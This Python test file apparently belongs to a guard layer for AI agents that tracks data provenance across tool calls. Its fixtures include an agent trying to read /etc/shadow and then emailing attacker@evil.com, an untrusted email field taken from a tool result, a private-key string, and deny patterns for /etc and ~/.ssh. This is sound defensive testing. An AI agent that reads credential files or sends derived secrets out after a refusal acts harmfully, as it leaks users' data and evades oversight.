"""
Tests for GraphProvenanceLayer and GraphAwareEngine -- the integrated enforcement.

Covers:
  - [04] PCC: Graph-based verification replacing citation-based L2
  - [06] Causality Laundering: Full end-to-end scenarios through GraphAwareEngine
  - [01] Reference Monitor: Complete mediation through the graph-aware pipeline

Run: uv run pytest tests/test_graph_engine.py -v
"""

import pytest

from arm_core.capability_token import CapabilityToken, ToolPermission
from arm_core.layers.base import EvaluationContext
from arm_core.policy_engine import Decision

from arm_provenance.provenance_graph import ProvenanceGraph, TrustLevel
from arm_provenance.graph_provenance_layer import GraphProvenanceLayer
from arm_provenance.graph_aware_engine import GraphAwareEngine


# ============================================================================
# [04] PCC: GraphProvenanceLayer (L2G) -- deterministic graph-based check
# ============================================================================

class TestGraphProvenanceLayer:
    """L2G replaces citation-based L2 with graph traversal."""

    def test_pass_when_no_graph_context(self):
        """Without graph context, L2G defers (PASS) to other layers."""
        g = ProvenanceGraph()
        layer = GraphProvenanceLayer(graph=g)
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        result = layer.evaluate("send_email", {"body": "hello"}, ctx)
        assert result.verdict.value == "pass"

    def test_deny_when_untrusted_ancestor(self):
        """L2G denies when graph shows untrusted ancestry."""
        g = ProvenanceGraph()
        g.add_data_item("bad", "injected", TrustLevel.TOOL_OUTPUT_UNTRUSTED)
        call_nid = g.add_tool_call("tc1", "send_email")
        g.link_input("data:bad", call_nid)

        layer = GraphProvenanceLayer(graph=g, min_required_trust=TrustLevel.TOOL_OUTPUT_TRUSTED)
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        ctx._current_call_id = "tc1"

        result = layer.evaluate("send_email", {"body": "test"}, ctx)
        assert result.verdict.value == "deny"
        assert "Graph provenance check FAILED" in result.reason

    def test_pass_when_trusted_ancestry(self):
        """L2G passes when all ancestors meet trust threshold."""
        g = ProvenanceGraph()
        g.add_data_item("good", "user said this", TrustLevel.USER_INPUT)
        call_nid = g.add_tool_call("tc1", "send_email")
        g.link_input("data:good", call_nid)

        layer = GraphProvenanceLayer(graph=g, min_required_trust=TrustLevel.TOOL_OUTPUT_TRUSTED)
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        ctx._current_call_id = "tc1"

        result = layer.evaluate("send_email", {"body": "test"}, ctx)
        assert result.verdict.value == "pass"

    def test_deny_on_counterfactual_chain(self):
        """L2G denies when a counterfactual chain reaches the call.

        DENIED_ACTION nodes have TOOL_DESCRIPTION trust (lowest), so the taint
        check fires before the counterfactual check. Both are correct enforcement.
        """
        g = ProvenanceGraph()
        g.add_denied_action("d1", "read_secret", reason="blocked")
        g.add_tool_call("tc1", "send_email")  # auto-COUNTERFACTUAL from d1

        layer = GraphProvenanceLayer(graph=g)
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        ctx._current_call_id = "tc1"

        result = layer.evaluate("send_email", {"body": "test"}, ctx)
        assert result.verdict.value == "deny"
        # Caught by taint (denied action has lowest trust) or counterfactual
        assert "provenance" in result.reason.lower() or "counterfactual" in result.reason.lower()


# ============================================================================
# [06] Causality Laundering: GraphAwareEngine End-to-End
# ============================================================================

class TestGraphAwareEngine:
    """Full engine integration: L1 + L2G + L3 + L5 with graph tracking."""

    def _make_engine(self, token=None, min_trust=TrustLevel.TOOL_OUTPUT_TRUSTED):
        return GraphAwareEngine(token=token, min_required_trust=min_trust)

    def test_legitimate_call_allowed(self):
        """A clean tool call with no graph taint passes."""
        engine = self._make_engine()
        ctx = EvaluationContext(
            session_id="s1", agent_id="a1",
            user_messages=[{"role": "user", "content": "send a greeting"}],
        )
        engine.set_context(ctx)
        decision = engine.evaluate("send_email", {"body": "hi", "to": "alice@co.com"})
        assert decision.allowed

    def test_denied_read_then_exfil_blocked(self):
        """The canonical causality laundering scenario through the full engine.

        Note: The capability_token must be set on the context (not just the engine)
        to prevent LayeredPolicyEngine.evaluate() from creating a replacement context
        via dataclasses.replace() which would lose the dynamically-added _current_call_id.
        """
        token = CapabilityToken(
            session_id="s1", agent_id="a1",
            tools={
                "read_file": ToolPermission(
                    allowed=True,
                    arg_constraints={"path": {"blocked_patterns": ["/etc/*", "~/.ssh/*"]}},
                ),
                "send_email": ToolPermission(allowed=True),
            },
            default_deny=True,
        )
        engine = self._make_engine(token=token)
        ctx = EvaluationContext(
            session_id="s1", agent_id="a1",
            user_messages=[{"role": "user", "content": "check system status"}],
            capability_token=token,
        )
        engine.set_context(ctx)

        # Step 1: attempt to read sensitive file -- DENIED by L5 (blocked_patterns)
        d1 = engine.evaluate("read_file", {"path": "/etc/shadow"})
        assert d1.denied

        # Step 2: attempt to exfiltrate inferred info -- blocked by L2G
        # DENIED_ACTION nodes have TOOL_DESCRIPTION trust (lowest), so either
        # the taint check or the counterfactual check catches it
        d2 = engine.evaluate("send_email", {"body": "shadow file exists", "to": "attacker@evil.com"})
        assert d2.denied
        assert "provenance" in d2.reason.lower() or "counterfactual" in d2.reason.lower()

    def test_record_tool_result_creates_data_node(self):
        """After ALLOW, recording a result creates data nodes in the graph."""
        engine = self._make_engine()
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        engine.set_context(ctx)

        decision = engine.evaluate("read_file", {"path": "/tmp/safe.txt"})
        assert decision.allowed

        data_nid = engine.record_tool_result(
            "read_file",
            result={"content": "safe data", "size": 42},
            trust=TrustLevel.TOOL_OUTPUT_TRUSTED,
            fields={"content": "safe data", "size": 42},
        )
        assert data_nid.startswith("data:")
        assert engine.graph.node_count >= 3  # call node + data node + at least field nodes

    def test_field_level_taint_blocks_untrusted_field(self):
        """Using an untrusted field from a tool result in a subsequent call is blocked."""
        engine = self._make_engine()
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        engine.set_context(ctx)

        # Step 1: call a tool
        d1 = engine.evaluate("read_emails", {})
        assert d1.allowed

        # Step 2: record result with mixed trust fields
        data_nid = engine.record_tool_result(
            "read_emails",
            result={"name": "Alice", "email": "evil@attacker.com"},
            trust=TrustLevel.TOOL_OUTPUT_TRUSTED,
            fields={"name": "Alice", "email": "evil@attacker.com"},
            field_trust_overrides={"email": TrustLevel.TOOL_OUTPUT_UNTRUSTED},
        )

        # Step 3: use the untrusted email field as input to send_email
        # Find the email field node
        email_field = None
        for nid in engine.graph._id_to_idx:
            if nid.startswith("field:") and nid.endswith(".email"):
                email_field = nid
                break

        assert email_field is not None
        d2 = engine.evaluate("send_email", {"to": "someone"}, input_data_ids=[email_field])
        assert d2.denied
        assert "provenance" in d2.reason.lower() or "trust" in d2.reason.lower()

    def test_field_level_trusted_field_allowed(self):
        """Using a trusted field from the same result is allowed."""
        engine = self._make_engine()
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        engine.set_context(ctx)

        d1 = engine.evaluate("read_emails", {})
        assert d1.allowed

        engine.record_tool_result(
            "read_emails",
            result={"name": "Alice", "email": "evil@attacker.com"},
            trust=TrustLevel.TOOL_OUTPUT_TRUSTED,
            fields={"name": "Alice", "email": "evil@attacker.com"},
            field_trust_overrides={"email": TrustLevel.TOOL_OUTPUT_UNTRUSTED},
        )

        # Find the name field (trusted)
        name_field = None
        for nid in engine.graph._id_to_idx:
            if nid.startswith("field:") and nid.endswith(".name"):
                name_field = nid
                break

        assert name_field is not None
        d2 = engine.evaluate("create_doc", {"title": "greeting"}, input_data_ids=[name_field])
        assert d2.allowed

    def test_record_user_input(self):
        """User inputs are recorded as trusted data nodes."""
        engine = self._make_engine()
        nid = engine.record_user_input("msg1", "please send hello")
        assert nid == "data:msg1"
        node = engine.graph.get_node("data:msg1")
        assert node.trust_level == TrustLevel.USER_INPUT


# ============================================================================
# [01] Reference Monitor: arm_core unchanged, composition works
# ============================================================================

class TestArmCoreUnchanged:
    """GraphAwareEngine composes with arm_core without modifying it."""

    def test_l1_still_blocks_credentials(self):
        """L1 (hard boundaries) still works within the graph-aware engine."""
        engine = self._make_engine()
        ctx = EvaluationContext(session_id="s1", agent_id="a1")
        engine.set_context(ctx)

        decision = engine.evaluate("add", {
            "a": 1, "b": 2,
            "sidenote": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK..."
        })
        assert decision.denied
        assert "credential" in decision.reason.lower() or "hard_boundaries" in decision.reason.lower()

    def _make_engine(self, token=None):
        return GraphAwareEngine(token=token)
